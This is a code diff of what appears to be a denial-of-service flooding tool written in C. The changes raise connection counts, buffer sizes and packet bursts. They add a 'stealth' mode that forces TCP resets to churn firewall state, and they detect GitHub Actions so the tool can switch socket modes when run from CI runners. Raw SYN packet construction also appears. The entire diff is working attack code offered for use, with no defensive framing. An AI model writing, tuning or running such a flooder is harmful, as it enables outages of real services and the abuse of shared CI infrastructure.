@@ -1663,13 +1663,18 @@ void *worker_thread(void *arg) {
     }
     if (args.is_v17_tcp_bypass) {
         // === AUTO-DETECT: Raw socket vs SOCK_STREAM ===
-        // GitHub Actions blocks raw packets → auto-fallback to SOCK_STREAM
+        // GitHub Actions: raw packets pass sendto() but get network-blocked after ~2s
+        int is_ci = (getenv("GITHUB_ACTIONS") != NULL);
         int use_raw = 0;
-        {
+        if (is_ci) {
+            if (tid == 0) {
+                LOG_INFO("T0: GitHub Actions detected → forcing SOCK_STREAM (raw gets network-blocked)");
+                fflush(stdout);
+            }
+        } else {
             int tfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
             if (tfd >= 0) {
                 int h = 1; setsockopt(tfd, IPPROTO_IP, IP_HDRINCL, &h, sizeof(h));
-                // Build minimal test packet (SYN to target)
                 unsigned char tpkt[40];
                 memset(tpkt, 0, sizeof(tpkt));
                 struct iphdr *tip = (struct iphdr*)tpkt;
@@ -1711,11 +1716,12 @@ void *worker_thread(void *arg) {
                 usleep(200000); // Other threads wait for T0 to clean rules
             }
             
-            #define RT_CONNS 500
+            #define RT_CONNS 2000
             #define RT_PL 1400
-            #define RT_SNDBUF (4*1024*1024)
-            #define RT_MAX_BYTES (1024*1024)  // 1MB before recycle
-            #define RT_EPOLL_SZ 512
+            #define RT_SNDBUF (16*1024*1024)
+            #define RT_MAX_BYTES (2*1024*1024)  // 2MB before recycle
+            #define RT_STEALTH_MAX (256*1024)   // 256KB for stealth (fast state churn)
+            #define RT_EPOLL_SZ 2048
             
             unsigned char *rt_pl = malloc(RT_PL);
             for (int i = 0; i < RT_PL; i++) rt_pl[i] = fast_rand() & 0xFF;
@@ -1776,7 +1782,7 @@ void *worker_thread(void *arg) {
                             if (err) goto rt_reconn;
                             rt_st[idx] = 1;
                         }
-                        for (int burst = 0; burst < 64; burst++) {
+                        for (int burst = 0; burst < 128; burst++) {
                             *((unsigned int*)rt_pl) = fast_rand();
                             *((unsigned int*)(rt_pl+4)) = fast_rand();
                             *((unsigned int*)(rt_pl+8)) = fast_rand();
@@ -1790,12 +1796,18 @@ void *worker_thread(void *arg) {
                                 goto rt_reconn;
                             }
                         }
-                        if (rt_sn[idx] > RT_MAX_BYTES) goto rt_reconn;
+                        unsigned int rt_limit = args.is_stealth ? RT_STEALTH_MAX : RT_MAX_BYTES;
+                        if (rt_sn[idx] > rt_limit) goto rt_reconn;
                     }
                     continue;
                     
                     rt_reconn:
                     epoll_ctl(rt_epfd, EPOLL_CTL_DEL, fd, NULL);
+                    // Stealth: force RST on close → firewall state churn
+                    if (args.is_stealth) {
+                        struct linger sl = {1, 0};
+                        setsockopt(fd, SOL_SOCKET, SO_LINGER, &sl, sizeof(sl));
+                    }
                     close(fd);
                     fd = socket(AF_INET, SOCK_STREAM, 0);
                     if (fd >= 0) {
